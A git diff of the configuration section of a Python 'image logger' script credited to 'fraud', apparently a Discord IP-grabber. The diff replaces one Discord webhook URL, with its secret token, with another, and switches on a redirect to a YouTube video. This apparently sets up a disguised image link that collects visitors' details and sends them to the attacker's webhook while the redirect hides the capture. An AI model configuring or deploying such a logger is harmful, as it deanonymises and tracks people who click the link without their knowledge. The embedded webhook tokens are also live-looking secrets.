@@ -9,7 +9,7 @@ __author__ = "fraud"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1437508963733082264/haQeMj-aUkalVXXB-Mskk4OycIgO7oeV6Q_tO2FP-MiCpU4f-lZxk6Vxxo3rPCzTbyWU",
+    "webhook": "https://discord.com/api/webhooks/1518362441312899257/3FSURJmWJQr3gc8yvqo5wOpCagnDG6N31rG0D5Q0NwQIfi9XwltLFqmV63XA1J-MeBqt",
     "image": "https://i.pinimg.com/736x/46/20/15/462015d16734ede653fa7860aee45af2.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
@@ -47,8 +47,8 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": False, # Redirect to a webpage?
-        "page": "https://your-link.here" # Link to the webpage to redirect to 
+        "redirect": True, # Redirect to a webpage?
+        "page": "https://www.youtube.com/watch?v=ecRZTFgjh0E&list=RDecRZTFgjh0E&start_radio=1" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
